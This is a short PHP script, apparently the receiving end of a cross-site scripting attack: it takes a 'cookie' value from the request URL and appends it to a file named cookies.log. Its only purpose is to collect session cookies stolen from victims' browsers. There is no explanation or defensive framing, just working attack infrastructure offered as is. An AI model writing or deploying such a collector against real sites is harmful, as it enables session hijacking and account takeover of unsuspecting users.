<?php
$cookie = $_GET['cookie'];
file_put_contents('cookies.log', $cookie . "\n", FILE_APPEND);

?>
